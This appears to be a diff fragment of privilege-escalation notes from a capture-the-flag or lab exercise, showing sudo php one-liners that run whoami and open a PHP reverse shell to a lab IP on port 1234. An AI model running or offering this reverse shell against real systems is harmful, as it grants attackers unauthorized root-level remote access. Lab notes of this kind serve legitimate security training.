@@ -15,7 +15,7 @@ using `:#!/bin/bash` we can get a shell
 
 sudo /usr/bin/php -r "system('whoami');"
 
-sudo /usr/bin/php -r '$sock=fsockopen("10.10.14.207",1234);exec("/bin/sh <&3 >&3 2>&3");'
+sudo /usr/bin/php -r '$sock=fsockopen("10.10.14.4",1234);exec("/bin/sh <&3 >&3 2>&3");'
 
 ## sudo -l: shows find
 
